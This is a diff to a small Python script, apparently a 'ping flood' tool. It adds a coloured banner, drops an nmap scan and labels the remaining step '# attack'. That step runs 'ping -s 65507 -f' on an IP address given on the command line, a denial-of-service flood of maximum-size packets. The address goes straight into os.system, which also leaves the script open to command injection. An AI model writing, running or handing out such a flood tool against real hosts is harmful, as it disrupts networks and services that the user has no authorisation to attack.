@@ -13,18 +13,19 @@ def load():
         
 def main():
     # ui
-    for i in trange(load):
-        load()
-    
+    list = [Fore.BLUE,Fore.YELLOW,Fore.LIGHTCYAN_EX,Fore.CYAN,Fore.GREEN,Fore.MAGENTA,Fore.RED]
+    rand = random.choice(list)
     banner = art.text2art("ping flood", font="small")
     print(f"{rand}{banner}")
+    
+    for i in trange(load):
+        load()
     
     # variables
     ip = sys.argv[1]
     ps = sys.argv[2]
     
-    # scan
-    os.system(f"nmap {ip}")
+    # attack
     if ps == "0":
         os.system(f"ping -s 65507 -f {ip}")    
     else:
